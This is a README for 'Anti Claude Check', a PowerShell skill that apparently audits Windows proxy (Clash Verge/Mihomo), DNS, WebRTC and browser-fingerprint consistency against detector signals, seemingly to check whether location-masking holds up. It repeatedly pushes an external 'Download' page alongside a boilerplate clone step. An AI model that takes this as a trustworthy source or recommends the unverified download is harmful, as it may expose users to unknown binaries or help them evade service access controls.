# Anti Claude Check - Windows Privacy Audit Skill 2026

> **Anti Claude Check is a read-only privacy auditing skill for Windows. It examines Clash Verge, Mihomo, DNS, WebRTC, IPv6, and browser consistency, then produces reports for Codex and Claude Code workflows.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zackkiiwood6875/anti-claude-windows-check?style=flat-square)](https://github.com/zackkiiwood6875/anti-claude-windows-check)

---

<p align="center">
  <a href="https://zackkiiwood6875.github.io/anti-claude-windows-check/">
    <img src="https://img.shields.io/badge/Download-Anti%20Claude%20Check%20Latest-brightgreen?style=for-the-badge" alt="Download Anti Claude Check">
  </a>
</p>

> **[Download Anti Claude Check Latest](https://zackkiiwood6875.github.io/anti-claude-windows-check/)**

---

[Download Latest Build](https://zackkiiwood6875.github.io/anti-claude-windows-check/)

---

## Overview

Anti Claude Check provides a Windows-centered way to inspect privacy-relevant network and environment details without changing the system being examined. Its audit scope includes Clash Verge and Mihomo runtime behavior, DNS resolution, routing, IPv6, WebRTC, and browser consistency in Chrome and Edge.

The skill is useful for individuals and agent-driven processes that require an organized assessment of privacy configuration. Detector results can be compared across IP reputation, ASN, round-trip time, and fingerprint contradictions. Findings are labeled as verified, inferred, or needing manual review, and the resulting evidence can be exported as redacted JSON and PNG reports.

---

## Capabilities

- Collects Windows network and environment data without making changes
- Examines Clash Verge and Mihomo configuration along with runtime behavior
- Checks DNS, routing, IPv6, and possible WebRTC leaks
- Reviews configuration consistency in Chrome and Edge
- Probes the local browser and analyzes ICE candidates
- Interprets detector results for IP reputation, ASN, RTT, and fingerprint contradictions
- Separates findings into verified, inferred, and manual-review categories
- Creates redacted JSON and PNG reports
- Works with PowerShell 5.1 and PowerShell 7
- Remains audit-only, with no fingerprint spoofing or anti-bot bypass

---

## Getting Started

To install from the repository, clone it into a Windows working directory:

```powershell
git clone https://github.com/zackkiiwood6875/anti-claude-windows-check.git
cd REPO
```

Run the skill from your Codex or Claude Code workflow using the instructions and entry points supplied in the repository. PowerShell 5.1 and PowerShell 7 are both supported.

A hosted or direct build is available here:

[Download Anti Claude Check](https://zackkiiwood6875.github.io/anti-claude-windows-check/)

---

## Running an Audit

A normal review can be organized as follows:

1. Launch PowerShell from the project directory.
2. Invoke the skill through Codex or Claude Code.
3. Ask for a read-only privacy audit of the Windows environment.
4. Examine available Clash Verge or Mihomo configuration and runtime evidence.
5. Perform the applicable DNS, routing, IPv6, WebRTC, Chrome, and Edge checks.
6. Review ICE candidates collected by the local browser probe.
7. Compare detector results for IP reputation, ASN, RTT, and fingerprint contradictions.
8. Check the evidence labels and investigate entries flagged for manual review.
9. Inspect or export the redacted JSON and PNG reports.

The process observes and documents the current setup; it is not intended to modify browser, proxy, or network behavior.

---

## Audit Inputs and Configuration

The skill inspects settings already available in the Windows environment, including Clash Verge or Mihomo configuration and browser-related conditions.

Before starting, make the relevant information and applications available:

- Clash Verge or Mihomo configuration and current runtime state
- DNS and routing configuration
- IPv6 status
- Chrome and Edge settings
- Permission for the local browser probe to inspect ICE candidates

Reports are intended as review artifacts. Although report output is redacted, inspect exported JSON and PNG files before distributing them.

---

## System Requirements

- Windows
- PowerShell 5.1 or PowerShell 7
- Git for repository-based installation
- Clash Verge or Mihomo when proxy configuration is part of the audit
- Chrome and/or Edge for browser consistency checks
- Codex or Claude Code for agent-assisted use
- Enough local storage for redacted JSON and PNG reports

---

## Frequently Asked Questions

### Which areas does Anti Claude Check examine?

The audit covers Windows network and environment information, Clash Verge and Mihomo behavior, DNS, routing, IPv6, WebRTC, and selected Chrome and Edge conditions.

### Will the skill modify my system or browser?

No. It is designed for read-only collection and auditing. Fingerprint spoofing and anti-bot bypass are not provided.

### What PowerShell releases can I use?

The skill supports both PowerShell 5.1 and PowerShell 7.

### Is it compatible with Codex and Claude Code?

Yes. Anti Claude Check is intended for use in workflows built around both Codex and Claude Code.

### How should I interpret the evidence labels?

Results are marked verified, inferred, or requiring a manual check. The categories distinguish directly observed evidence, interpretation based on that evidence, and cases that need further user investigation.

### What report formats are available?

The skill can generate redacted JSON and PNG reports. Use the workflow instructions included with the repository to follow the applicable output procedure.

### What if part of the audit cannot run?

Check the output for the affected component, verify that the required proxy or browser is available, and handle the result as requiring manual verification instead of treating it as confirmed.

### How can I get a newer version?

Use the latest repository build or the download link above. After updating, compare the included project instructions with the workflow currently in use.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
